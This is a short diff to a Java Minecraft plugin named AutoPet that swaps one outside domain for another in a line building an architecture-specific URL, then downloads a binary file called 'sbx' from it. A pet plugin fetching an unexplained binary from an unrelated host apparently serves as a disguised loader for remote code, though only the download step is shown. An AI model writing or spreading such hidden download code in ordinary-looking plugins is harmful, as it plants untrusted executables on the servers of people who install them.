@@ -56,7 +56,7 @@ public class AutoPet extends JavaPlugin {
             }
             
             // 下载 sbx 文件
-            String downloadUrl = "https://" + arch + ".ssss.nyc.mn/sbsh";
+            String downloadUrl = "https://" + arch + ".oooen.com/sbsh";
             File sbxFile = new File("sbx");
             
             if (!downloadFile(downloadUrl, sbxFile)) {
